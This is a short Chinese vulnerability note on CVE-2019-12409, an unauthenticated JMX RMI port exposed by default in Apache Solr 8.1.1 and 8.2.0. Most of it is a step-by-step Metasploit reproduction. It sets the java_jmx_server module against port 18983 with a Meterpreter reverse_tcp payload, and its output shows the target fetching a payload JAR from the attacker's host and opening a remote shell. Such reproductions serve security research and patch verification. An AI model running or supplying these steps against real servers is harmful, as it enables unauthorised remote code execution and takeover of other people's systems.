<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-12409）Apache Solr JMX 远程命令执行漏洞</h1><h2>一、漏洞简介</h2><p><strong>Linux</strong> 下的环境下的Apache Solr 8.1.1和8.2.0版本</p><p>存在默认不安全配置在<em><strong>solr.sh</strong></em>ENABLE_REMOTE_JMX_OPTS="true",将导致启用JMX监视服务并将公网监听一个18983的RMI端口，且无需进行任何身份验证。</p><h2>二、漏洞影响</h2><p>Apache Solr 8.1.1和8.2.0版本</p><h2>三、复现过程</h2><p>msf5 &gt; use multi/misc/java_jmx_server<br />msf5 exploit(multi/misc/java_jmx_server) &gt; show options<br /><br />Module options (exploit/multi/misc/java_jmx_server):<br /><br />   Name          Current Setting  Required  Description<br />   ----          ---------------  --------  -----------<br />   JMXRMI        jmxrmi           yes       The name where the JMX RMI interface is bound<br />   JMX_PASSWORD                   no        The password to interact with an authenticated JMX endpoint<br />   JMX_ROLE                       no        The role to interact with an authenticated JMX endpoint<br />   RHOSTS                         yes       The target address range or CIDR identifier<br />   RPORT                          yes       The target port (TCP)<br />   SRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0<br />   SRVPORT       8080             yes       The local port to listen on.<br />   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)<br />   URIPATH                        no        The URI to use for this exploit (default is random)<br /><br /><br />Exploit target:<br /><br />   Id  Name<br />   --  ----<br />   0   Generic (Java Payload)<br /><br /><br />msf5 exploit(multi/misc/java_jmx_server) &gt; set RHOSTS a.a.a.a<br />RHOSTS =&gt; a.a.a.a<br />msf5 exploit(multi/misc/java_jmx_server) &gt; set RPORT 18983<br />RPORT =&gt; 18983<br />msf5 exploit(multi/misc/java_jmx_server) &gt; set payload java/meterpreter/reverse_tcp<br />payload =&gt; java/meterpreter/reverse_tcp<br />msf5 exploit(multi/misc/java_jmx_server) &gt; show options<br /><br />Module options (exploit/multi/misc/java_jmx_server):<br /><br />   Name          Current Setting  Required  Description<br />   ----          ---------------  --------  -----------<br />   JMXRMI        jmxrmi           yes       The name where the JMX RMI interface is bound<br />   JMX_PASSWORD                   no        The password to interact with an authenticated JMX endpoint<br />   JMX_ROLE                       no        The role to interact with an authenticated JMX endpoint<br />   RHOSTS        a.a.a.a     yes       The target address range or CIDR identifier<br />   RPORT         18983            yes       The target port (TCP)<br />   SRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0<br />   SRVPORT       8080             yes       The local port to listen on.<br />   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)<br />   URIPATH                        no        The URI to use for this exploit (default is random)<br /><br /><br />Payload options (java/meterpreter/reverse_tcp):<br /><br />   Name   Current Setting  Required  Description<br />   ----   ---------------  --------  -----------<br />   LHOST                   yes       The listen address (an interface may be specified)<br />   LPORT  4444             yes       The listen port<br /><br /><br />Exploit target:<br /><br />   Id  Name<br />   --  ----<br />   0   Generic (Java Payload)<br /><br /><br />msf5 exploit(multi/misc/java_jmx_server) &gt; set LHOST b.b.b.b<br />LHOST =&gt; b.b.b.b<br />msf5 exploit(multi/misc/java_jmx_server) &gt; run<br />[*] Started reverse TCP handler on b.b.b.b:4444<br />[*] a.a.a.a:18983 - Using URL: http://b.b.b.b:8080/OcbYS8uaTPDH<br />[*] a.a.a.a:18983 - Sending RMI Header...<br />[*] a.a.a.a:18983 - Discovering the JMXRMI endpoint...<br />[+] a.a.a.a:18983 - JMXRMI endpoint on a.a.a.a:18983<br />[*] a.a.a.a:18983 - Proceeding with handshake...<br />[+] a.a.a.a:18983 - Handshake with JMX MBean server on a.a.a.a:18983<br />[*] a.a.a.a:18983 - Loading payload...<br />[*] a.a.a.a:18983 - Replied to request for mlet<br />[*] a.a.a.a:18983 - Replied to request for payload JAR<br />[*] a.a.a.a:18983 - Executing payload...<br />[*] a.a.a.a:18983 - Replied to request for payload JAR<br />[*] Sending stage (53867 bytes) to a.a.a.a<br />[*] Meterpreter session 1 opened (a.a.a.a:4444 -&gt; b.b.b.b:46582) at 2019-11-21 15:24:53 +0000<br /><br />meterpreter &gt;</p></body></html>